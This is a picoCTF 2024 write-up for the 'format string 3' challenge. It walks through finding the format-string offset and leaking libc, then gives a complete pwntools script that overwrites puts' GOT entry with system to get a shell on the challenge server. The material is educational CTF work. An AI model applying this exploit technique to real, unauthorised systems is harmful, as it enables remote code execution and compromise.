# Description

_#Medium_<br>
_#Binary_Exploitation_<br>
_#picoCTF_2024_<br>
_#format_string_<br>
_#browser_webshell_solvable_<br>

This program ***doesn't contain a win function***. How can you win?<br>
Download the binary [here](format-string-3).<br>
Download the source [here](format-string-3.c).<br>
Download libc [here](libc.so.6), download the interpreter [here](ld-linux-x86-64.so.2).<br>
Run the binary with these two files present in the same directory.

## Solution

When I first looked at the challenge title, I immediately thought it would be very difficult for me. Initially, I didn’t even know where to start, so I decided to look for writeups online.  

To begin, I examined the source code to identify any vulnerabilities that could be exploited. After conducting some research, I realized this challenge was more complex than the previous ones. It required leaking an address and finding the input string offset to overwrite and replace the puts function with the system function. Ultimately, the program will be ended up by executing system("/bin/sh"), which spawns a shell, and thus I can get the flag from the shell.

![image](https://github.com/user-attachments/assets/6cc812fe-ad8a-4d4d-a782-3402ec58fc9e)<br>
**The source code.*

Once I understood the concept of exploiting this challenge, I began by running the provided program to observe its execution and output. To do this, I connected to the challenge instance on the PicoCTF site by entering the command `nc rhea.picoctf.net 53133` in the Kali terminal. To test upon the input and observe the output, I input a simple string as input to the program, which will be printed back to stdout(buf) function call.

![image](https://github.com/user-attachments/assets/4fe4f694-24f7-4c0d-80e0-d365cdd464e1)<br>
**The stdin and stdout function call.*

In this case, I know I can use format specifiers to read arbitrary stack values.

> [!NOTE]
> Arbitrary stack value  
> From what I understand, it seems to involve the addresses for inputs. Whenever we enter something into the program, it gets stored in the program's background process. Hence, we can simply use the **format specifiers** like %x (hexadecimal) or %p (pointers) to read the arbitrary values from the program.

![image](https://github.com/user-attachments/assets/487a6098-68f9-41c7-9f82-aa99b42c927d)<br>
**The output of input testing.*

From this, I tested again with the input `AAAAAAAA%2$p` to observe the output. The result displayed 8's A followed by the second argument, which should correspond to the second memory address.

![image](https://github.com/user-attachments/assets/aa5e5a23-b732-4de1-9f2c-5aaef71add85)<br>
**The testing result.*

> [!TIP]
> Ideally, the format specifier **%n$p** where n is an offset to point exactly at the start of the input string. You can do this manually (%p, %2$p, %3$p…) until %p points to the desired input string.

Now, I can determine the offset of the input string by entering 8 'A's followed by as many %p placeholders as possible. This allows me to clearly identify where the input appears in the displayed output.

![image](https://github.com/user-attachments/assets/3311c030-448c-46ee-b452-1596aa511be0)<br>
**The input is at the 38th position.*

Once I gathered all the necessary information, I prepared a script to incorporate everything needed to exploit the shell and retrieve the flag. The script used is shown below.

``` python
#!/usr/bin/env python3
from pwn import *

# Context setup
exe = "./format-string-3"
libc_path = "./libc.so.6"

context.binary = ELF(exe)
libc = ELF(libc_path)
context.terminal = ["tmux", "splitw", "-h"]

# Offset for the format string vulnerability
FMT_STR_OFFSET = 38


def leak_libc_base(io):
    """Leaks the libc base address from the provided setvbuf leak."""
    io.recvuntil(b'setvbuf in libc: ')
    setvbuf_leak = int(io.recvline().strip(), 16)
    log.info(f"Leaked setvbuf address: {hex(setvbuf_leak)}")

    libc_base = setvbuf_leak - libc.symbols["setvbuf"]
    log.info(f"Calculated libc base address: {hex(libc_base)}")

    libc.address = libc_base  # Set the base address for further calculations
    return libc_base


def create_payload():
    """Creates the format string payload to overwrite GOT entry for `puts`."""
    target_address = context.binary.got["puts"]
    system_address = libc.symbols["system"]
    log.info(f"Target address (GOT entry for puts): {hex(target_address)}")
    log.info(f"New function address (system): {hex(system_address)}")

    payload = fmtstr_payload(FMT_STR_OFFSET, {target_address: system_address})
    log.info(f"Generated payload: {payload}")
    return payload


def main():
    # Connect to the target binary (remote)
    io = remote("rhea.picoctf.net", 53133)

    # Attach GDB for debugging if required
    if args.GDB:
        gdb.attach(io, gdbscript="b *main+127\ncontinue")

    # Leak libc base address
    libc_base = leak_libc_base(io)

    # Create the payload to exploit the format string vulnerability
    payload = create_payload()

    # Send the payload
    io.sendline(payload)

    # Get an interactive shell
    io.interactive()


if __name__ == "__main__":
    main()
```
**This script was written with reference to [online author].(https://blog.thecyberthesis.com/blog/writeups/picoCTF/pwn/format-string-3).*
